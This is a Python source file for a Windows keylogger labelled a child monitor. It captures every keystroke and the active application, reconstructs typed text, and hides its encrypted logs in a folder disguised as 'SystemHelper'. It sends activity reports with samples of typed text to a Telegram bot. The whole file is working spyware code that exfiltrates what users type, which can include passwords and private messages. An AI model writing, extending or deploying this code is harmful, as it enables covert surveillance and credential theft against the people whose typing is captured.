import os
import sys
import time
import datetime
import threading
import json
import queue
import logging
import requests
import win32gui
import win32event
import win32api
import winerror
import psutil
import subprocess
import win32crypt
import win32process
import string
from pynput import keyboard
from collections import defaultdict, deque
from cryptography.fernet import Fernet
import sched
from decouple import config, Csv

print("Starting application...")

# ==== CONFIG AND SECRETS ====
try:
    print("Loading configuration...")
    TELEGRAM_TOKEN = config('TELEGRAM_TOKEN')
    TELEGRAM_CHAT_ID = config('TELEGRAM_CHAT_ID', cast=int)

    SAVE_INTERVAL = config('SAVE_INTERVAL', default=300, cast=int)
    DAILY_INTERVAL = config('DAILY_INTERVAL', default=86400, cast=int)
    MAX_BUFFER_SIZE = config('MAX_BUFFER_SIZE', default=1000, cast=int)
    MAX_RETRIES = config('MAX_RETRIES', default=5, cast=int)
    IGNORE_PROCS = set(config('IGNORE_PROCS', default='', cast=Csv()))
    KEYSTROKE_CHUNK_SIZE = 30
    WINDOW_CHECK_INTERVAL = 1

    print(f"Configuration loaded. TELEGRAM_TOKEN: {'*' * len(TELEGRAM_TOKEN) if TELEGRAM_TOKEN else 'NOT SET'}")
    print(f"TELEGRAM_CHAT_ID: {TELEGRAM_CHAT_ID}")
    print(f"DAILY_INTERVAL: {DAILY_INTERVAL} seconds ({DAILY_INTERVAL / 3600:.1f} hours)")

except Exception as e:
    print(f"Error loading configuration: {e}")
    sys.exit(1)

# Directory setup
try:
    print("Setting up directories...")
    BASE_DIR = os.path.join(os.getenv('APPDATA'), 'SystemHelper')
    LOG_FILE = os.path.join(BASE_DIR, 'activity.log.enc')
    QUEUE_FILE = os.path.join(BASE_DIR, 'msg_queue.dat')
    KEY_FILE = os.path.join(BASE_DIR, 'fernet.key.dat')
    PID_CACHE_FILE = os.path.join(BASE_DIR, 'pid_cache.json')

    os.makedirs(BASE_DIR, exist_ok=True)
    print(f"Base directory created: {BASE_DIR}")

    try:
        subprocess.call(['attrib', '+h', BASE_DIR], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        print(f"Warning: Could not hide directory: {e}")

except Exception as e:
    print(f"Error setting up directories: {e}")
    sys.exit(1)

# Logger setup
try:
    print("Setting up logger...")
    logger = logging.getLogger('ActivityMonitor')
    logger.setLevel(logging.INFO)

    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.DEBUG)
    console_formatter = logging.Formatter('%(asctime)s %(levelname)s %(message)s')
    console_handler.setFormatter(console_formatter)
    logger.addHandler(console_handler)

    file_handler = logging.FileHandler(os.path.join(BASE_DIR, 'monitor.log'), 'a', 'utf-8')
    file_handler.setFormatter(logging.Formatter('%(asctime)s %(levelname)s %(message)s'))
    logger.addHandler(file_handler)

    print("Logger configured successfully")

except Exception as e:
    print(f"Error setting up logger: {e}")
    sys.exit(1)


class SecureKeyStore:
    def __init__(self, path_key):
        print(f"Initializing SecureKeyStore with path: {path_key}")
        self.path_key = path_key
        try:
            self._load_or_generate()
            print("SecureKeyStore initialized successfully")
        except Exception as e:
            print(f"Error initializing SecureKeyStore: {e}")
            raise

    def _protect(self, data: bytes) -> bytes:
        try:
            result = win32crypt.CryptProtectData(
                data, None, None, None, None,
                0x4 | 0x1
            )
            print("Data protected successfully")
            return result
        except Exception as e:
            print(f"Error protecting data: {e}")
            raise

    def _unprotect(self, blob: bytes) -> bytes:
        try:
            result = win32crypt.CryptUnprotectData(
                blob, None, None, None,
                0x1
            )[1]
            print("Data unprotected successfully")
            return result
        except Exception as e:
            print(f"Error unprotecting data: {e}")
            raise

    def _load_or_generate(self):
        if os.path.exists(self.path_key):
            print("Loading existing key...")
            try:
                with open(self.path_key, 'rb') as f:
                    blob = f.read()
                raw = self._unprotect(blob)
                print("Key loaded successfully")
            except Exception as e:
                print(f'Failed to read key: {e}')
                logger.exception(f'Failed to read key: {e}')
                sys.exit(1)
        else:
            print("Generating new key...")
            try:
                raw = Fernet.generate_key()
                blob = self._protect(raw)
                with open(self.path_key, 'wb') as f:
                    f.write(blob)
                print("New key generated and saved")
            except Exception as e:
                print(f"Error generating new key: {e}")
                raise

        self._fernet = Fernet(raw)

    @property
    def fernet(self):
        return self._fernet


class PidCache:
    def __init__(self, cache_file):
        print(f"Initializing PidCache with file: {cache_file}")
        self.cache_file = cache_file
        self.cache = {}
        self._load_cache()

    def _load_cache(self):
        if os.path.exists(self.cache_file):
            try:
                with open(self.cache_file, 'r') as f:
                    self.cache = json.load(f)
                print(f"PID cache loaded with {len(self.cache)} entries")
            except Exception as e:
                print(f"Error loading PID cache: {e}")
                self.cache = {}
        else:
            print("No existing PID cache found")

    def save_cache(self):
        try:
            with open(self.cache_file, 'w') as f:
                json.dump(self.cache, f)
        except Exception as e:
            logger.error(f"Error saving PID cache: {e}")

    def get_process_name(self, pid):
        if pid in self.cache:
            return self.cache[pid]
        try:
            proc = psutil.Process(pid)
            name = proc.name().lower()
            self.cache[pid] = name
            return name
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            return "unknown"


class ChildMonitor:
    def __init__(self):
        print("Initializing ChildMonitor...")
        try:
            # Enhanced activity map to track key types
            self.activity_map = defaultdict(lambda: {
                'time': 0.0,
                'keystrokes': 0,
                'key_types': defaultdict(int)
            })
            self.log_buffer = deque(maxlen=MAX_BUFFER_SIZE)
            self.msg_queue = queue.Queue()
            self.activity_lock = threading.RLock()
            self.queue_lock = threading.Lock()
            self.scheduler = sched.scheduler(time.time, time.sleep)
            self.exit_event = threading.Event()
            self.last_report_time = time.time()
            self.last_window_check = time.time()

            self.current_proc = None
            self.last_hwnd = None
            self.hwnd_change_time = time.time()

            # For tracking actual typed content
            self.typed_content = {'text': '', 'start_time': time.time(), 'last_time': time.time()}
            self.TYPING_TIMEOUT = 5.0  # Increased timeout for typing sessions
            self.TYPING_SAMPLE_TIMEOUT = 60.0  # Show samples from the last 60 seconds

            print("Initializing PID cache...")
            self.pid_cache = PidCache(PID_CACHE_FILE)

            print("Initializing secure key store...")
            self.secure_store = SecureKeyStore(KEY_FILE)
            self.fernet = self.secure_store.fernet

            print("Loading message queue...")
            self._load_queue()

            print("Starting keyboard listener...")
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()

            print("Starting worker threads...")
            threading.Thread(target=self._send_worker, daemon=True).start()
            threading.Thread(target=self._window_check_worker, daemon=True).start()

            self.scheduler.enter(SAVE_INTERVAL, 1, self._flush_logs)
            self.scheduler.enter(DAILY_INTERVAL, 1, self._send_report)
            threading.Thread(target=self._scheduler_thread, daemon=True).start()

            print("ChildMonitor initialized successfully")
            logger.info(f"Monitor started with DAILY_INTERVAL: {DAILY_INTERVAL} seconds")

        except Exception as e:
            print(f"Error initializing ChildMonitor: {e}")
            logger.exception(f"Error in ChildMonitor.__init__: {e}")
            raise

    def _scheduler_thread(self):
        while not self.exit_event.is_set():
            try:
                self.scheduler.run(blocking=False)
                time.sleep(1)
            except Exception as e:
                logger.error(f"Scheduler error: {e}")

    def _get_proc_name(self, hwnd):
        try:
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            if pid == 0:
                return None

            window_title = win32gui.GetWindowText(hwnd)
            if window_title:
                parts = window_title.split(' - ')
                if len(parts) > 1:
                    return parts[-1].strip().lower()

            return self.pid_cache.get_process_name(pid)
        except Exception as e:
            logger.debug(f"Error getting process name: {e}")
            return None

    def _update_activity_time(self):
        now = time.time()
        if self.current_proc and self.current_proc not in IGNORE_PROCS:
            elapsed = now - self.hwnd_change_time
            with self.activity_lock:
                self.activity_map[self.current_proc]['time'] += elapsed
        self.hwnd_change_time = now

    def _check_window_change(self):
        try:
            hwnd = win32gui.GetForegroundWindow()
            if hwnd != self.last_hwnd or self.last_hwnd is None:
                self.last_hwnd = hwnd
                proc = self._get_proc_name(hwnd)

                self._update_activity_time()
                self.current_proc = proc

                # Only reset typing content if we're switching to a different app
                if proc != self.current_proc:
                    self.typed_content = {'text': '', 'start_time': time.time(), 'last_time': time.time()}

                return True
        except Exception as e:
            logger.error(f"Window check error: {e}")
        return False

    def _window_check_worker(self):
        while not self.exit_event.is_set():
            try:
                self._check_window_change()
                time.sleep(WINDOW_CHECK_INTERVAL)
            except Exception as e:
                logger.error(f"Window worker error: {e}")

    def _get_key_representation(self, key):
        """Get a human-readable representation of the key"""
        try:
            if hasattr(key, 'char') and key.char:
                return key.char
            elif key == keyboard.Key.space:
                return " "
            elif key == keyboard.Key.enter:
                return "\n"
            elif key == keyboard.Key.tab:
                return "\t"
            elif hasattr(key, 'name'):
                return f"[{key.name}]"
            else:
                return f"[{key}]"
        except:
            return f"[unknown_key]"

    def _categorize_key(self, key):
        """Categorize keys into meaningful groups"""
        try:
            # Try to get character representation
            if hasattr(key, 'char') and key.char:
                char = key.char
                # Categorize character keys
                if char.isalpha():
                    return 'Letters'
                elif char.isdigit():
                    return 'Numbers'
                elif char in string.punctuation:
                    return 'Punctuation'
                elif char.isspace():
                    return 'Whitespace'
                return 'Special Chars'

            # Handle special keys
            if hasattr(key, 'name'):
                name = key.name.lower()
                if name.startswith('f') and name[1:].isdigit():
                    return 'Function Keys'
                elif name in ['enter', 'tab', 'backspace', 'delete', 'esc']:
                    return 'Navigation'
                elif name in ['shift', 'ctrl', 'alt', 'cmd', 'caps_lock']:
                    return 'Modifiers'
                elif name in ['space']:
                    return 'Whitespace'
                elif name.startswith(('page_', 'home', 'end')):
                    return 'Navigation'
                elif name.startswith(('arrow', 'insert')):
                    return 'Navigation'
                elif name.startswith(('media_', 'volume')):
                    return 'Media'
                return 'Special Keys'

            return 'Unknown'
        except:
            return 'Unknown'

    def _on_press(self, key):
        try:
            self._check_window_change()

            if not self.current_proc or self.current_proc in IGNORE_PROCS:
                return

            now = time.time()
            key_repr = self._get_key_representation(key)

            # Initialize or continue typing session
            if now - self.typed_content.get('last_time', 0) > self.TYPING_TIMEOUT:
                # New typing session
                self.typed_content = {'text': '', 'start_time': now, 'last_time': now}
            else:
                # Continue existing session
                self.typed_content['last_time'] = now

            # Handle special keys
            if key == keyboard.Key.backspace:
                # Remove last character
                if self.typed_content.get('text'):
                    self.typed_content['text'] = self.typed_content['text'][:-1]
            elif key == keyboard.Key.enter:
                # Add newline
                self.typed_content['text'] += "\n"
            elif key == keyboard.Key.tab:
                # Add tab
                self.typed_content['text'] += "\t"
            elif key_repr not in ['[shift]', '[ctrl]', '[alt]', '[cmd]', '[caps_lock]']:
                # Add character representation
                self.typed_content['text'] += key_repr

            # Log individual key
            entry = f"{datetime.datetime.now():%H:%M:%S}|{self.current_proc}|{key_repr}"
            self.log_buffer.append(entry)

            # Categorize and track key type
            key_type = self._categorize_key(key)
            with self.activity_lock:
                self.activity_map[self.current_proc]['keystrokes'] += 1
                self.activity_map[self.current_proc]['key_types'][key_type] += 1

        except Exception as e:
            logger.error("Keypress exception", exc_info=True)

    def enqueue(self, item):
        with self.queue_lock:
            item.setdefault('retries', 0)
            self.msg_queue.put(item)

    def _send_worker(self):
        while not self.exit_event.is_set():
            try:
                item = self.msg_queue.get(timeout=5)
                try:
                    if item['type'] == 'text':
                        text = item['text']
                        for i in range(0, len(text), 4000):
                            part = text[i:i + 4000]
                            requests.post(
                                f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage',
                                data={'chat_id': TELEGRAM_CHAT_ID, 'text': part},
                                timeout=10
                            )
                    else:
                        with open(item['path'], 'rb') as f:
                            requests.post(
                                f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument',
                                data={'chat_id': TELEGRAM_CHAT_ID},
                                files={'document': f},
                                timeout=15
                            )
                    self._save_queue()
                except Exception as e:
                    item['retries'] += 1
                    logger.warning(f"Send failed ({item['retries']}): {e}")
                    if item['retries'] <= MAX_RETRIES:
                        time.sleep(min(2 ** item['retries'], 300))
                        self.msg_queue.put(item)
                    else:
                        logger.error(f"Dropping after {MAX_RETRIES}: {item}")
                finally:
                    self.msg_queue.task_done()
            except queue.Empty:
                pass

    def _flush_logs(self):
        if self.exit_event.is_set():
            return

        try:
            self._update_activity_time()

            if not self.log_buffer:
                return

            with self.activity_lock:
                data_chunk = list(self.log_buffer)
                self.log_buffer.clear()

            for i in range(0, len(data_chunk), KEYSTROKE_CHUNK_SIZE):
                chunk_part = data_chunk[i:i + KEYSTROKE_CHUNK_SIZE]
                self._save_log_chunk(chunk_part)

        except Exception as e:
            logger.error(f"Log flush error: {e}")
        finally:
            if not self.exit_event.is_set():
                self.scheduler.enter(SAVE_INTERVAL, 1, self._flush_logs)

    def _save_log_chunk(self, chunk):
        try:
            data = '\n'.join(chunk).encode()
            enc = self.fernet.encrypt(data)
            with open(LOG_FILE, 'ab') as f:
                f.write(enc + b'\n')
        except Exception as e:
            logger.error(f"Log save error: {e}")

    def _send_report(self):
        if self.exit_event.is_set():
            return

        try:
            # Calculate report period correctly
            report_end_time = time.time()
            tracking_seconds = report_end_time - self.last_report_time
            tracking_hours = tracking_seconds / 3600

            # Update activity time before generating report
            self._update_activity_time()

            with self.activity_lock:
                report = []
                total_time = 0.0
                total_keys = 0

                # Process activity data
                for proc, data in self.activity_map.items():
                    if data['time'] > 0 or data['keystrokes'] > 0:
                        hours = data['time'] / 3600
                        report.append({
                            'process': proc,
                            'hours': hours,
                            'keystrokes': data['keystrokes'],
                            'key_types': dict(data['key_types'])
                        })
                        total_time += data['time']
                        total_keys += data['keystrokes']

                report.sort(key=lambda x: x['hours'], reverse=True)

                # Generate report text
                report_text = (
                    f"📊 **Activity Report (Last {tracking_hours:.1f} hours)**\n"
                    f"Total tracked time: {total_time / 3600:.2f}h | Keystrokes: {total_keys}\n"
                    "--------------------------------\n"
                )

                # Add process details
                for entry in report[:15]:
                    if entry['hours'] < 0.001 and entry['keystrokes'] == 0:
                        continue

                    report_text += (
                        f"▪ `{entry['process'][:20]:20}`: "
                        f"{entry['hours']:>5.2f}h | "
                        f"{entry['keystrokes']:>5} keys\n"
                    )

                    # Add key type breakdown for this process
                    if entry['keystrokes'] > 0:
                        key_breakdown = []
                        for k_type, count in sorted(entry['key_types'].items(), key=lambda x: x[1], reverse=True):
                            key_breakdown.append(f"{k_type}: {count}")

                        if key_breakdown:
                            report_text += f"    Key types: {', '.join(key_breakdown[:5])}"
                            if len(key_breakdown) > 5:
                                report_text += f" +{len(key_breakdown) - 5} more"
                            report_text += "\n"

                # Add summary if no significant activity
                if len(report) == 0:
                    report_text += "\nNo significant activity detected."

                # Add typed content sample if available
                now = time.time()
                if self.typed_content.get('text') and now - self.typed_content.get('last_time',
                                                                                   0) < self.TYPING_SAMPLE_TIMEOUT:
                    sample = self.typed_content['text']
                    # Only show if we have meaningful content
                    if sample.strip():
                        # Truncate to avoid huge messages
                        sample = sample.strip()
                        sample = sample[:200] + ('...' if len(sample) > 200 else '')
                        report_text += f"\n✍️ **Recent Typing Sample:**\n```\n{sample}\n```"

                # Add overall key type statistics
                if total_keys > 0:
                    all_key_types = defaultdict(int)
                    for entry in report:
                        for k_type, count in entry['key_types'].items():
                            all_key_types[k_type] += count

                    top_key_types = sorted(all_key_types.items(), key=lambda x: x[1], reverse=True)[:5]
                    key_summary = [f"{k}: {v}" for k, v in top_key_types]
                    report_text += f"\n🔑 **Top Key Types:** {', '.join(key_summary)}"

                self.enqueue({
                    'type': 'text',
                    'text': report_text
                })

                # Reset counters
                self.activity_map.clear()

        except Exception as e:
            logger.error(f"Report error: {e}")
        finally:
            # Update last report time AFTER generating the report
            self.last_report_time = time.time()

            if not self.exit_event.is_set():
                # Schedule next report correctly
                next_report = time.time() + DAILY_INTERVAL
                self.scheduler.enterabs(next_report, 1, self._send_report)
                logger.info(f"Next report scheduled at {datetime.datetime.fromtimestamp(next_report)}")

    def _save_queue(self):
        try:
            with self.queue_lock:
                items = []
                while not self.msg_queue.empty():
                    items.append(self.msg_queue.get())
                    self.msg_queue.task_done()

                for item in items:
                    self.msg_queue.put(item)

                if items:
                    with open(QUEUE_FILE, 'wb') as f:
                        data = json.dumps(items).encode()
                        encrypted = self.fernet.encrypt(data)
                        f.write(encrypted)
        except Exception as e:
            logger.error(f'Queue save error: {e}')

    def _load_queue(self):
        if not os.path.exists(QUEUE_FILE):
            return

        try:
            with open(QUEUE_FILE, 'rb') as f:
                encrypted = f.read()
                data = self.fernet.decrypt(encrypted).decode()
                items = json.loads(data)
                for item in items:
                    self.msg_queue.put(item)
        except Exception as e:
            logger.error(f'Queue load error: {e}')

    def _cleanup(self):
        try:
            if self.listener.is_alive():
                self.listener.stop()

            self._update_activity_time()
            self._flush_logs()
            self.pid_cache.save_cache()

            self.msg_queue.join()
            self._save_queue()
        except Exception as e:
            logger.error(f"Cleanup error: {e}")
        finally:
            sys.exit(0)

    def run(self):
        print("Starting main loop...")
        try:
            while not self.exit_event.is_set():
                time.sleep(1)
        except KeyboardInterrupt:
            print("Keyboard interrupt received")
            self.exit_event.set()
            self._cleanup()


if __name__ == '__main__':
    try:
        print("Checking for duplicate process...")
        mutex = win32event.CreateMutex(None, False, "Global\\SystemHelperMonitor")
        if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
            print("Process already running - exiting.")
            sys.exit(0)

        print("Creating and starting monitor...")
        monitor = ChildMonitor()
        monitor.run()

    except Exception as e:
        print(f"Critical error: {e}")
        logger.exception(f"Critical error: {e}")
        import traceback

        traceback.print_exc()
        sys.exit(1)
